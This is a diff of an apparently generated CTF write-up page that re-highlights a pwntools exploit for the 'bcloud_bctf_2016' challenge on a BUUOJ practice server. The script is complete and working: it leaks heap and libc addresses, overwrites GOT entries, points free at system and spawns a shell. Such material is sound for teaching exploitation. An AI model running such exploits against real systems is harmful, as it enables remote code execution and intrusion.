@@ -4155,63 +4155,63 @@
 </span><span class="lnt">57
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from pwn import *
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">context.log_level=&#39;debug&#39;
-</span></span><span class="line"><span class="cl"># io = process(&#34;/home/fofa/bcloud_bctf_2016&#34;)
-</span></span><span class="line"><span class="cl">elf = ELF(&#34;/home/fofa/bcloud_bctf_2016&#34;)
-</span></span><span class="line"><span class="cl">libc = ELF(&#34;/home/fofa/buulibc/libc-2.23-32.so&#34;)
-</span></span><span class="line"><span class="cl">io = remote(&#34;node5.buuoj.cn&#34;,29264)
-</span></span><span class="line"><span class="cl">def add_chunk(size, content):
-</span></span><span class="line"><span class="cl">    io.sendlineafter(&#39;option---&gt;&gt;\n&#39;, &#39;1&#39;)
-</span></span><span class="line"><span class="cl">    io.sendlineafter(&#34;Input the length of the note content:\n&#34;, str(size))
-</span></span><span class="line"><span class="cl">    io.sendlineafter(&#34;Input the content:\n&#34;, content)
-</span></span><span class="line"><span class="cl">    io.recvline()
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># io = process(&#34;/home/fofa/bcloud_bctf_2016&#34;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;/home/fofa/bcloud_bctf_2016&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;/home/fofa/buulibc/libc-2.23-32.so&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node5.buuoj.cn&#34;</span><span class="p">,</span><span class="mi">29264</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add_chunk</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;option---&gt;&gt;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Input the length of the note content:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Input the content:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">def exit_chunk(idx, content):
-</span></span><span class="line"><span class="cl">    io.sendlineafter(&#39;option---&gt;&gt;\n&#39;, &#39;3&#39;)
-</span></span><span class="line"><span class="cl">    io.sendlineafter(&#34;Input the id:\n&#34;, str(idx))
-</span></span><span class="line"><span class="cl">    io.sendlineafter(&#34;Input the new content:\n&#34;, content)
-</span></span><span class="line"><span class="cl">    io.recvline()
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exit_chunk</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;option---&gt;&gt;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;3&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Input the id:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Input the new content:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">def del_chunk(idx):
-</span></span><span class="line"><span class="cl">    io.sendlineafter(&#39;option---&gt;&gt;\n&#39;, &#39;4&#39;)
-</span></span><span class="line"><span class="cl">    io.sendlineafter(&#34;Input the id:\n&#34;, str(idx))
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">del_chunk</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;option---&gt;&gt;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;4&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Input the id:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">io.sendafter(&#34;Input your name:\n&#34;, &#39;a&#39; * 0x40)
-</span></span><span class="line"><span class="cl">io.recvuntil(&#39;a&#39;*0x40)
-</span></span><span class="line"><span class="cl">heap_addr = u32(io.recv(4))
-</span></span><span class="line"><span class="cl">info(&#34;heap_addr:&#34;+hex(heap_addr))
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;Input your name:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x40</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x40</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">heap_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="s2">&#34;heap_addr:&#34;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_addr</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">io.sendafter(&#34;Org:\n&#34;, b&#39;b&#39; * 0x40)
-</span></span><span class="line"><span class="cl">io.sendafter(&#34;Host:\n&#34;, p32(0xffffffff) + (0x40 - 4) * b&#39;a&#39;)
-</span></span><span class="line"><span class="cl"># io.recvuntil(&#34;OKay! Enjoy:)\n&#34;)
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;Org:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;b&#39;</span> <span class="o">*</span> <span class="mh">0x40</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;Host:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="mh">0x40</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span> <span class="o">*</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># io.recvuntil(&#34;OKay! Enjoy:)\n&#34;)</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">top_chunk = heap_addr+0xd0
-</span></span><span class="line"><span class="cl">offset = 0x0804B120 -top_chunk-20
+</span></span><span class="line"><span class="cl"><span class="n">top_chunk</span> <span class="o">=</span> <span class="n">heap_addr</span><span class="o">+</span><span class="mh">0xd0</span>
+</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mh">0x0804B120</span> <span class="o">-</span><span class="n">top_chunk</span><span class="o">-</span><span class="mi">20</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">add_chunk(offset,&#39;&#39;)
-</span></span><span class="line"><span class="cl">for i in range(4):
-</span></span><span class="line"><span class="cl">    add_chunk(0x40,&#39;aaa&#39;)
+</span></span><span class="line"><span class="cl"><span class="n">add_chunk</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">add_chunk</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span><span class="s1">&#39;aaa&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">exit_chunk(1, p32(0x804b120) * 2 + p32(elf.got[&#39;free&#39;]) + p32(elf.got[&#39;printf&#39;]))
-</span></span><span class="line"><span class="cl">exit_chunk(2, p32(elf.plt[&#39;puts&#39;]))
+</span></span><span class="line"><span class="cl"><span class="n">exit_chunk</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x804b120</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;free&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl"><span class="n">exit_chunk</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]))</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">del_chunk(3)
+</span></span><span class="line"><span class="cl"><span class="n">del_chunk</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">libc.address=u32(io.recv(4))-libc.sym[&#39;printf&#39;]
-</span></span><span class="line"><span class="cl">info(&#34;libc_base:&#34;+hex(libc.address))
-</span></span><span class="line"><span class="cl">exit_chunk(1, p32(0x804b130) * 2 + p32(elf.got[&#39;free&#39;]) * 2 + b&#39;/bin/sh&#39;)
+</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">=</span><span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="s2">&#34;libc_base:&#34;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">exit_chunk</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x804b130</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;free&#39;</span><span class="p">])</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">exit_chunk(2, p32(libc.sym[&#39;system&#39;]))
+</span></span><span class="line"><span class="cl"><span class="n">exit_chunk</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]))</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">del_chunk(0)
-</span></span><span class="line"><span class="cl"># del_chunk(3)
-</span></span><span class="line"><span class="cl"># gdb.attach(io)
+</span></span><span class="line"><span class="cl"><span class="n">del_chunk</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># del_chunk(3)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># gdb.attach(io)</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">io.interactive()
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div>
